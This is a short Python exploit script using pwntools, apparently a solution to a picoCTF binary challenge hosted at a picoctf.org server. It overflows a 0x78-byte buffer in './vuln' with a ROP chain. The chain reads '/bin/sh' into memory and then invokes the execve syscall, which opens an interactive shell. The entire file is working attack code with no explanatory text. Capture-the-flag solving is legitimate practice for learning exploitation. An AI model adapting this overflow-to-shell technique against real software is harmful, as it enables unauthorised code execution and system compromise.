#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'

BIN = './vuln'

if len(sys.argv) > 1:
    r = remote('jupiter.challenges.picoctf.org', 50581)
else:
    r = process(BIN)

pop_rdi_ret = 0x400696
pop_rdx_ret = 0x44a6b5
pop_rsi_ret = 0x410ca3
pop_rax_ret = 0x4163f4
syscall_ret = 0x449e35

p = flat(
    pop_rax_ret,
    0,
    pop_rdi_ret,
    0,
    pop_rsi_ret,
    0x6b7000,
    pop_rdx_ret,
    8,
    syscall_ret,
    pop_rax_ret,
    0x3b,
    pop_rdi_ret,
    0x6b7000,
    pop_rsi_ret,
    0,
    pop_rdx_ret,
    0,
    syscall_ret,
)

p = b'A'*0x78 + p

r.sendline('84')
input()
r.sendline(p)
input()
r.send('/bin/sh\x00')

r.interactive()
